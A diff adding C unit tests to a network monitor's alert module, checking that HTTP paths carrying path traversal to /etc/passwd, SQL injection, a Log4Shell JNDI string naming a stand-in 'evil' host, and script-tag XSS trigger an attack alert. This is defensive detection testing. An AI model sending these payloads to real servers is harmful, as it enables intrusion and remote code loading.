@@ -359,6 +359,67 @@ static void add_http(sloth_state_t *s, const char *src,
     e->ts = time(NULL);
 }
 
+static void add_http_path(sloth_state_t *s, const char *src,
+                           const char *host, const char *path) {
+    if (s->http_log_count >= MAX_HTTP_LOG) return;
+    http_log_entry_t *e = &s->http_log[s->http_log_count++];
+    memset(e, 0, sizeof(*e));
+    snprintf(e->src,        sizeof(e->src),        "%s", src);
+    snprintf(e->host,       sizeof(e->host),       "%s", host);
+    snprintf(e->method,     sizeof(e->method),     "GET");
+    snprintf(e->path,       sizeof(e->path),       "%s", path);
+    e->ts = time(NULL);
+}
+
+static void test_attack_path_traversal_fires(void) {
+    alerts_clear();
+    sloth_state_t s; seed_state(&s);
+    add_http_path(&s, "10.0.0.5", "target.example",
+                  "/files?name=../../etc/passwd");
+    alerts_update(&s);
+    ASSERT(find_alert(&s, ALERT_TYPE_ATTACK_PATH) >= 0);
+}
+
+static void test_attack_path_sqli_fires(void) {
+    alerts_clear();
+    sloth_state_t s; seed_state(&s);
+    add_http_path(&s, "10.0.0.5", "target.example",
+                  "/products?id=1+union+select+null,version()");
+    alerts_update(&s);
+    ASSERT(find_alert(&s, ALERT_TYPE_ATTACK_PATH) >= 0);
+}
+
+static void test_attack_path_log4shell_fires(void) {
+    alerts_clear();
+    sloth_state_t s; seed_state(&s);
+    add_http_path(&s, "10.0.0.5", "target.example",
+                  "/?x=${jndi:ldap://evil/exploit}");
+    alerts_update(&s);
+    ASSERT(find_alert(&s, ALERT_TYPE_ATTACK_PATH) >= 0);
+}
+
+static void test_attack_path_xss_fires(void) {
+    alerts_clear();
+    sloth_state_t s; seed_state(&s);
+    add_http_path(&s, "10.0.0.5", "target.example",
+                  "/search?q=%3Cscript%3Ealert(1)%3C/script%3E");
+    /* That's the encoded form; not all encoded variants are caught.
+     * Use the raw-script variant which IS in the table. */
+    add_http_path(&s, "10.0.0.5", "target.example",
+                  "/search?q=<script>alert(1)</script>");
+    alerts_update(&s);
+    ASSERT(find_alert(&s, ALERT_TYPE_ATTACK_PATH) >= 0);
+}
+
+static void test_attack_path_normal_no_fire(void) {
+    alerts_clear();
+    sloth_state_t s; seed_state(&s);
+    add_http_path(&s, "10.0.0.5", "google.com", "/search?q=hello+world");
+    add_http_path(&s, "10.0.0.5", "example.com", "/api/v1/users/42");
+    alerts_update(&s);
+    ASSERT_EQ(find_alert(&s, ALERT_TYPE_ATTACK_PATH), -1);
+}
+
 static void test_attack_tool_ua_sqlmap_fires(void) {
     alerts_clear();
     sloth_state_t s; seed_state(&s);
@@ -678,6 +739,11 @@ void run_alerts_tests(void) {
     RUN_TEST(test_attack_tool_ua_sqlmap_fires);
     RUN_TEST(test_attack_tool_ua_nmap_case_insensitive);
     RUN_TEST(test_attack_tool_ua_normal_browser_no_fire);
+    RUN_TEST(test_attack_path_traversal_fires);
+    RUN_TEST(test_attack_path_sqli_fires);
+    RUN_TEST(test_attack_path_log4shell_fires);
+    RUN_TEST(test_attack_path_xss_fires);
+    RUN_TEST(test_attack_path_normal_no_fire);
 
     TEST_SUITE("alerts dedup");
     RUN_TEST(test_dedup_increments_count);
